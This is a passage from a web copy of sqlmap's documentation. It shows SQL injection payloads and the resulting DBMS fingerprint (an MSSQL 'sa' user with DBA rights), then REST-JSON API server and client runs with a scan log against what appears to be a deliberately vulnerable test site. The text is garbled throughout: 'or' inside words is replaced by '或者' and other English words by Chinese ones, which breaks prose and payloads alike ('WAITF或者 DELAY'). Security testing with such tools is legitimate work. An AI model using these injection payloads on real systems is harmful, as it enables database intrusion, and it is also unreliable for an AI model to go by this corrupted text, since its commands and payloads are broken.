query</span><br><span class=\"line\">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class=\"line\">    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58)+CHAR(118)+CHAR(114)+CHAR(1</span><br><span class=\"line\">00)+CHAR(58)+CHAR(70)+CHAR(79)+CHAR(118)+CHAR(106)+CHAR(87)+CHAR(101)+CHAR(119)+</span><br><span class=\"line\">CHAR(115)+CHAR(114)+CHAR(77)+CHAR(58)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)-- </span><br><span class=\"line\"></span><br><span class=\"line\">    Type: stacked queries</span><br><span class=\"line\">    Title: Microsoft SQL Server/Sybase stacked queries</span><br><span class=\"line\">    Payload: id=1; WAITF或者 DELAY &#x27;0:0:5&#x27;--</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: AND/或者 time-based blind</span><br><span class=\"line\">    Title: Microsoft SQL Server/Sybase time-based blind</span><br><span class=\"line\">    Payload: id=1 WAITF或者 DELAY &#x27;0:0:5&#x27;--</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: inline query</span><br><span class=\"line\">    Title: Microsoft SQL Server/Sybase inline queries</span><br><span class=\"line\">    Payload: id=(SELECT CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+CHAR(58)+(SELECT </span><br><span class=\"line\">(CASE WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR</span><br><span class=\"line\">(109)+CHAR(113)+CHAR(58))</span><br><span class=\"line\">---</span><br><span class=\"line\">web server operating system: Windows XP</span><br><span class=\"line\">web application technology: ASP, Microsoft IIS 5.1</span><br><span class=\"line\">back-end DBMS operating system: Windows XP Service Pack 2</span><br><span class=\"line\">back-end DBMS: Microsoft SQL Server 2005</span><br><span class=\"line\">banner:</span><br><span class=\"line\">---</span><br><span class=\"line\">Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) </span><br><span class=\"line\">    Oct 14 2005 00:33:37 </span><br><span class=\"line\">    Copyright (c) 1988-2005 Microsoft C或者p或者ation</span><br><span class=\"line\">    Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)</span><br><span class=\"line\">---</span><br><span class=\"line\">current user:    &#x27;sa&#x27;</span><br><span class=\"line\">current database:    &#x27;testdb&#x27;</span><br><span class=\"line\">current user is DBA:    True</span><br><span class=\"line\"></span><br><span class=\"line\">[*] shutting down at xx:xx:52</span><br></pre></td></tr></table></figure>\n<h2 id=\"api-rest-json\"><a class=\"anchor\" href=\"#api-rest-json\">#</a> API (REST-JSON)</h2>\n<p>sqlmap can be run through the REST-JSON API, API (abbr. f 或者 Application Program Interface) that uses JSON f 或者 REST (abbr. f 或者 REpresentational State Transfer) communication between server and client instance (s). In plainspeak, server runs the sqlmap 扫描 (s), while clients are setting the sqlmap 选项 s/switches and pull the results back. Main program file f 或者 running the API is  <code>sqlmapapi.py</code> , while the client can also be implemented inside the arbitrary user program.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmapapi.py -hh</span><br><span class=\"line\">Usage: sqlmapapi.py [选项s]</span><br><span class=\"line\"></span><br><span class=\"line\">选项s:</span><br><span class=\"line\">  -h, --help            show 这个 help message and exit</span><br><span class=\"line\">  -s, --server          Act as a REST-JSON API server</span><br><span class=\"line\">  -c, --client          Act as a REST-JSON API client</span><br><span class=\"line\">  -H HOST, --host=HOST  Host of the REST-JSON API server (default &quot;127.0.0.1&quot;)</span><br><span class=\"line\">  -p P或者T, --p或者t=P或者T  P或者t of the the REST-JSON API server (default 8775)</span><br><span class=\"line\">  --adapter=ADAPTER     Server (bottle) adapter to use (default &quot;wsgiref&quot;)</span><br></pre></td></tr></table></figure>\n<p>Server runs the  <code>sqlmapapi.py</code>  by using switch  <code>-s</code> , client by using switch  <code>-c</code> , while in both cases user can (选项 ally) set listening IP address with 选项  <code>-H</code>  (default  <code>&quot;127.0.0.1&quot;</code> ) and listening p 或者 t with 选项  <code>-p</code>  (default  <code>8775</code> ). Each client’s “session” can have multiple “tasks” (i.e. sqlmap 扫描 runs), where user can arbitrary choose which task should be currently active.</p>\n<p>Inside the client’s command line interface available commands are:</p>\n<ul>\n<li><code>help</code>  - showing list of available commands along with basic help inf 或者 mation</li>\n<li><code>new ARGS</code>  - starts a new 扫描 task with provided 参数 s (e.g.  <code>new -u &quot;http://testphp.vulnweb.com/artists.php?artist=1&quot;</code> )</li>\n<li><code>use TASKID</code>  - switches current context to different task (e.g.  <code>use c04d8c5c7582efb4</code> )</li>\n<li><code>data</code>  - retrieves and shows data f 或者 current task</li>\n<li><code>log</code> - retrieves and shows log f 或者 current task</li>\n<li><code>status</code>  - retrieves and shows status f 或者 current task</li>\n<li><code>stop</code>  - stops current task</li>\n<li><code>kill</code>  - kills current task</li>\n<li><code>list</code>  - displays all tasks (f 或者 current session)</li>\n<li><code>flush</code>  - flushes (i.e. deletes) all tasks</li>\n<li><code>exit</code>  - exits the client interface</li>\n</ul>\n<p>Example server run:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmapapi.py -s -H &quot;0.0.0.0&quot;</span><br><span class=\"line\">[12:47:51] [INFO] Running REST-JSON API server at &#x27;0.0.0.0:8775&#x27;..</span><br><span class=\"line\">[12:47:51] [INFO] Admin ID: 89fd118997840a9bd7fc329ab535b881</span><br><span class=\"line\">[12:47:51] [DEBUG] IPC database: /tmp/sqlmapipc-SzBQnd</span><br><span class=\"line\">[12:47:51] [DEBUG] REST-JSON API server connected to IPC database</span><br><span class=\"line\">[12:47:51] [DEBUG] Using adapter &#x27;wsgiref&#x27; to run bottle</span><br><span class=\"line\">[12:48:10] [DEBUG] Created new task: &#x27;a42ddaef02e976f0&#x27;</span><br><span class=\"line\">[12:48:10] [DEBUG] [a42ddaef02e976f0] Started 扫描</span><br><span class=\"line\">[12:48:16] [DEBUG] [a42ddaef02e976f0] Retrieved 扫描 status</span><br><span class=\"line\">[12:48:50] [DEBUG] [a42ddaef02e976f0] Retrieved 扫描 status</span><br><span class=\"line\">[12:48:55] [DEBUG] [a42ddaef02e976f0] Retrieved 扫描 log messages</span><br><span class=\"line\">[12:48:59] [DEBUG] [a42ddaef02e976f0] Retrieved 扫描 data and err或者 messages</span><br></pre></td></tr></table></figure>\n<p>Example client run:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmapapi.py -c -H &quot;192.168.110.1&quot;</span><br><span class=\"line\">[12:47:53] [DEBUG] Example client access 从 command line:</span><br><span class=\"line\">    $ taskid=$(curl http://192.168.110.1:8775/task/new 2&gt;1 | grep -o -I &#x27;[a-f0-9</span><br><span class=\"line\">]\\&#123;16\\&#125;&#x27;) &amp;&amp; echo $taskid</span><br><span class=\"line\">    $ curl -H &quot;Content-Type: application/json&quot; -X POST -d &#x27;&#123;&quot;url&quot;: &quot;http://testp</span><br><span class=\"line\">hp.vulnweb.com/artists.php?artist=1&quot;&#125;&#x27; http://192.168.110.1:8775/扫描/$taskid/st</span><br><span class=\"line\">art</span><br><span class=\"line\">    $ curl http://192.168.110.1:8775/扫描/$taskid/data</span><br><span class=\"line\">    $ curl http://192.168.110.1:8775/扫描/$taskid/log</span><br><span class=\"line\">[12:47:53] [INFO] Starting REST-JSON API client to &#x27;http://192.168.110.1:8775&#x27;..</span><br><span class=\"line\">.</span><br><span class=\"line\">[12:47:53] [DEBUG] Calling http://192.168.110.1:8775</span><br><span class=\"line\">[12:47:53] [INFO] Type &#x27;help&#x27; 或者 &#x27;?&#x27; f或者 list of available commands</span><br><span class=\"line\">api&gt; ?</span><br><span class=\"line\">help        Show 这个 help message</span><br><span class=\"line\">new ARGS    Start a new 扫描 task with provided 参数s (e.g. &#x27;new -u &quot;http://</span><br><span class=\"line\">testphp.vulnweb.com/artists.php?artist=1&quot;&#x27;)</span><br><span class=\"line\">use TASKID  Switch current context to different task (e.g. &#x27;use c04d8c5c7582efb4</span><br><span class=\"line\">&#x27;)</span><br><span class=\"line\">data        Retrieve and show data f或者 current task</span><br><span class=\"line\">log         Retrieve and show log f或者 current task</span><br><span class=\"line\">status      Retrieve and show status f或者 current task</span><br><span class=\"line\">stop        Stop current task</span><br><span class=\"line\">kill        Kill current task</span><br><span class=\"line\">list        Display all tasks</span><br><span class=\"line\">flush       Flush tasks (delete all tasks)</span><br><span class=\"line\">exit        Exit 这个 client</span><br><span class=\"line\">api&gt; new -u &quot;http://testphp.vulnweb.com/artists.php?artist=1&quot; --banner --flush-s</span><br><span class=\"line\">ession</span><br><span class=\"line\">[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/task/new</span><br><span class=\"line\">[12:48:10] [INFO] New task ID is &#x27;a42ddaef02e976f0&#x27;</span><br><span class=\"line\">[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/扫描/a42ddaef02e976f0/start</span><br><span class=\"line\">[12:48:10] [INFO] 扫描ning started</span><br><span class=\"line\">api (a42ddaef02e976f0)&gt; status</span><br><span class=\"line\">[12:48:16] [DEBUG] Calling http://192.168.110.1:8775/扫描/a42ddaef02e976f0/statu</span><br><span class=\"line\">s</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;status&quot;: &quot;running&quot;, </span><br><span class=\"line\">    &quot;returncode&quot;: null, </span><br><span class=\"line\">    &quot;success&quot;: true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">api (a42ddaef02e976f0)&gt; status</span><br><span class=\"line\">[12:48:50] [DEBUG] Calling http://192.168.110.1:8775/扫描/a42ddaef02e976f0/statu</span><br><span class=\"line\">s</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;status&quot;: &quot;terminated&quot;, </span><br><span class=\"line\">    &quot;returncode&quot;: 0, </span><br><span class=\"line\">    &quot;success&quot;: true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">api (a42ddaef02e976f0)&gt; log</span><br><span class=\"line\">[12:48:55] [DEBUG] Calling http://192.168.110.1:8775/扫描/a42ddaef02e976f0/log</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;log&quot;: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;flushing session file&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:10&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing connection to the target URL&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:10&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;checking if the target is protected by some kind of WAF/</span><br><span class=\"line\">IPS&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:10&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing if the target URL is stable&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:10&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;target URL is stable&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:11&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing if GET parameter &#x27;artist&#x27; is dynamic&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:11&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;confirming that GET parameter &#x27;artist&#x27; is dynamic&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:11&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;GET parameter &#x27;artist&#x27; is dynamic&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:11&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;heuristic (basic) test shows that GET parameter &#x27;artist&#x27;</span><br><span class=\"line\"> might be injectable (possible DBMS: &#x27;MySQL&#x27;)&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:11&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing f或者 SQL injection on GET parameter &#x27;artist&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:11&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;AND boolean-based blind - WHERE 或者 HAVING claus</span><br><span class=\"line\">e&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:11&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;GET parameter &#x27;artist&#x27; appears to be &#x27;AND boolean-based </span><br><span class=\"line\">blind - WHERE 或者 HAVING clause&#x27; injectable (with --string=\\&quot;hac\\&quot;)&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.5 AND err或者-based - WHERE, HAVING, O</span><br><span class=\"line\">RDER BY 或者 GROUP BY clause (BIGINT UNSIGNED)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.5 或者 err或者-based - WHERE, HAVING cla</span><br><span class=\"line\">use (BIGINT UNSIGNED)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.5 AND err或者-based - WHERE, HAVING, O</span><br><span class=\"line\">RDER BY 或者 GROUP BY clause (EXP)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.5 或者 err或者-based - WHERE, HAVING cla</span><br><span class=\"line\">use (EXP)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.7.8 AND err或者-based - WHERE, HAVING,</span><br><span class=\"line\"> 或者DER BY 或者 GROUP BY clause (JSON_KEYS)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span class=\"line\">        &#125;, </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;message&quot;: &quot;testing &#x27;MySQL &gt;= 5.7.8 或者 err或者-based - WHERE, HAVING c</span><br><span class=\"line\">lause (JSON_KEYS)&#x27;&quot;, </span><br><span class=\"line\">            &quot;level&quot;: &quot;INFO&quot;, </span><br><span class=\"line\">            &quot;time&quot;: &quot;12:48:12&quot;</span><br><span 